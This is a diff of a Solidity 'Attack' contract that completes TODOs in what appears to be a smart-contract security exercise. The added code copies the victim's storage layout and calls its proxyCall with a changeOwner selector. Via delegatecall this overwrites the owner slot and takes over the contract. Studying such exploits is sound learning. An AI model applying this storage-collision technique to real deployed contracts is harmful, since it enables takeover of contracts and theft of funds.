@@ -7,12 +7,20 @@ interface ID31eg4t3 {
 }
 
 contract Attack {
-    address internal immutable victim;
     // TODO: Declare some variable here
     // Note: Checkout the storage layout in victim contract
+    uint256 var0;
+    uint8 var1;
+    string var2;
+    address var3;
+    uint8 var4;
+    address public owner;
+    mapping(address => bool) public result;
+    address internal immutable victim;
 
     constructor(address addr) payable {
         victim = addr;
+        owner = msg.sender;
     }
 
     // NOTE: You might need some malicious function here
@@ -21,5 +29,12 @@ contract Attack {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
+        bytes memory data = abi.encodeWithSelector(Attack.changeOwner.selector);
+        (bool success,) = victim.call(abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
+    }
+
+    function changeOwner() external {
+        owner = tx.origin;
+        result[owner] = true;
     }
 }
